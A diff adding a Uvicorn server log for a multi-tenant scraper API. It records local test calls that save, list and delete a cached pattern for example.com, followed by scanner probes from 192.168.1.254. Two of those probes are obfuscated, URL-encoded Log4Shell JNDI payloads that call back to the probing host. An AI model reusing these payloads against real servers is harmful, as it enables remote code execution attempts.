@@ -1,0 +1,27 @@
+INFO:     Started server process [4023]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+2025-12-28 14:03:49,901 - universal_scraper.core.redis_cache - WARNING - Redis connection failed: There is no current event loop in thread 'AnyIO worker thread'.. Using in-memory fallback.
+2025-12-28 14:03:49,901 - universal_scraper.core.tenant_pattern_cache - WARNING - TenantPatternCache initialized without Redis - patterns won't persist
+2025-12-28 14:03:49,901 - api.main - INFO - [test-tenant] Saving pattern for domain: example.com
+2025-12-28 14:03:49,901 - universal_scraper.core.tenant_pattern_cache - INFO - Stored pattern for test-tenant:example.com (private)
+2025-12-28 14:03:49,901 - api.main - INFO - [test-tenant] Pattern storage result: True
+INFO:     127.0.0.1:49273 - "POST /api/v1/save-pattern HTTP/1.1" 200 OK
+2025-12-28 14:03:49,904 - api.main - INFO - [test-tenant] Listing patterns for domain: None
+2025-12-28 14:03:49,904 - api.main - INFO - [test-tenant] Found 1 patterns
+INFO:     127.0.0.1:49275 - "GET /api/v1/list-patterns HTTP/1.1" 200 OK
+2025-12-28 14:03:49,908 - universal_scraper.core.tenant_pattern_cache - INFO - Attempting to delete pattern: domain=example.com, fields=['title', 'price'], hash=bc2340f1
+2025-12-28 14:03:49,908 - universal_scraper.core.tenant_pattern_cache - INFO - Found pattern with key: pattern:test-tenant:example.com:bc2340f1
+2025-12-28 14:03:49,908 - universal_scraper.core.tenant_pattern_cache - INFO - Successfully deleted pattern for test-tenant: example.com (fields: ['title', 'price'])
+INFO:     127.0.0.1:49277 - "POST /api/v1/delete-pattern HTTP/1.1" 200 OK
+INFO:     192.168.1.254:45698 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     192.168.1.254:45704 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     192.168.1.254:42984 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.1.254:42992 - "GET /%24%7B%24%7Benv%3ATEST%3A-j%7Dndi%24%7Blower%3A%3A%7D%24%7Benv%3ATEST%3A-d%7Dn%24%7Blower%3As%7D%3A//192.168.1.254%3A39578/wXfahCnZkrpCNkwfaYEYwklsJhsJCqyD%7D HTTP/1.1" 404 Not Found
+INFO:     192.168.1.254:36610 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.1.254:39000 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     192.168.1.254:39012 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     192.168.1.254:54234 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.1.254:54246 - "GET /%24%7Bj%24%7Benv%3ATEST%3A-n%7D%24%7B%3A%3A-d%7D%24%7Blower%3Ai%7D%24%7Blower%3A%3A%7Dd%24%7Blower%3An%7D%24%7B%3A%3A-s%7D%3A//192.168.1.254%3A44306/XpnnUWuIjqYUmhWRkaCdkqanYEgrxpFD%7D HTTP/1.1" 404 Not Found
+INFO:     192.168.1.254:33134 - "POST / HTTP/1.1" 405 Method Not Allowed
